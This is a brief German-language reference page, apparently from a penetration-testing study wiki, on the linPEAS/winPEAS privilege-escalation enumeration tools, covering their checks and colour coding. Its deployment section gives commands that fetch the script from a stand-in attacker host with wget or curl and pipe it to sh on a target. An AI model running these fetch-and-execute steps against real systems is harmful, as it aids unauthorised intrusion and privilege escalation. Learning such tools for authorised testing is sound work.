# linPEAS / winPEAS (PEASS-ng)

**Kategorie:** Privilege-Escalation-Enumeration (automatisiert)

Die PEASS-ng-Suite sucht ein System automatisiert nach lokalen PrivEsc-Vektoren ab und **hebt wahrscheinliche Treffer farblich hervor**. **linPEAS** für Linux/Unix, **winPEAS** für Windows.

```bash
./linpeas.sh                 # Linux
winPEASx64.exe               # Windows
```

## Einsatz (vom Angreifer-Host übertragen)

```bash
# Kali:
cp /usr/share/peass/linpeas/linpeas.sh . && python3 -m http.server 8000
# Ziel:
cd /tmp; wget http://<KALI>:8000/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh | tee out.txt
# fileless:
curl http://<KALI>:8000/linpeas.sh | sh
```

## Farbcodierung

- **Rot/Gelb-Hintergrund** = „95% PE vector" (heißer Kandidat)
- **Rot** = interessant · **Gelb** = beachten

## Prüft u. a.

sudo-Rechte, SUID/SGID, Capabilities, Cron, writable Dateien/Services, Kernel-Version (Exploit-Hinweise), Credentials in Configs/History, Netzwerk, (Windows) Services/Registry/Tokens.

## Hinweis

Liefert **Kandidaten**, keine fertigen Exploits → verifizieren. Auch defensiv zum Self-Audit nutzbar. Installation: `sudo apt install peass` bzw. aus dem PEASS-ng-GitHub.

## Verwendet in

privilege-escalation 02, 09, 10.
